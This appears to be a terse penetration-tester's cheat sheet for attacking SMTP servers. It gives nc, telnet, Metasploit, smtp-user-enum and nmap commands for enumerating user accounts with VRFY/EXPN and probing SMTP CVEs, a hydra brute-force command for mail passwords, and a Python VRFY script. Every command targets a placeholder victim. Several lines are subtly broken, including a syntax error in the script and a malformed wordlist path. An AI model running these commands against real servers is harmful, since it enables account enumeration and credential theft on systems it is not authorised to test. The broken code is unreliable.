


### nc -nv [victim_ip] [smtp_port]
- VRFY root
- VRFY [some_user_name]
***VRFY***: verify an email address
***EXPN***: asks the server for the membership of mailing list

##### telnet <victim_ip> <port>
 
##### Metasploit
- auxiliary/scanner/smtp/smtp_enum
  - set rhosts <victim_ip>
  - run

### telnet
'''
>telnet [victim_ip] 25
>EHLO root
>DATA
>QUIT
'''

##### smtp-user-enum
- perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
dictionary
 - /usr/share/wordlists/metasploit/unix_users.txt
 - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt

##### nmap enumeration
- nmap –script smtp-enum-users.nse <victim_ip>
- nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]

##### Bruteforce
- hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V

###### example python VRFY automation script 
```python
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
  print("Usage: vrfy.py [username]"):
  sys.exit(0)
s=socket.socket(socket.AF_INET,

socket.SOCK_STREAM)
connect=s.connect(('[victim_ip]',25))
banner=s.recv(1024)
print(banner)
s.send('VRFY'+sys.argv[1]+'\r\n')
result=s.recv(1024)
print(result)
s.close()
```
